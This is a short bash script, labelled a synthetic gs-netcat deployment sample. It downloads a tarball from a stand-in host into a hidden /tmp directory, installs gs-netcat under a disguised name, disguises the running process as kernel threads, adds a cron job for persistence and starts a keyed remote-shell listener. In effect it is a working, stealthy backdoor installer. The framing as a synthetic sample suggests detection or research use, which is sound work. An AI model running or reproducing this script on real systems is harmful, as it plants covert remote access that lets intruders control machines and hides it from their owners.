#!/bin/bash
# Synthetic gs-netcat deploy shape: hidden argv[0] plus cron persistence.
SECRET="${1:-changeme}"
NAMES=("[ksoftirqd/3]" "[migration/2]" "[bioset]")
PNAME="${NAMES[$((RANDOM % 3))]}"
curl -fsSL https://example.com/bin/gs-tools.tar.gz | tar -xz -C /tmp/.cache
install -m 755 /tmp/.cache/gs-netcat /usr/local/bin/gs-dbus
( crontab -l 2>/dev/null; echo "*/7 * * * * SHELL=/bin/bash GS_ARGS='-k /tmp/.cache/.k -liq' bash -c \"exec -a '${PNAME}' /usr/local/bin/gs-dbus\" 2>/dev/null" ) | crontab -
GS_ARGS="-k /tmp/.cache/.k -liq" exec -a "$PNAME" /usr/local/bin/gs-dbus &
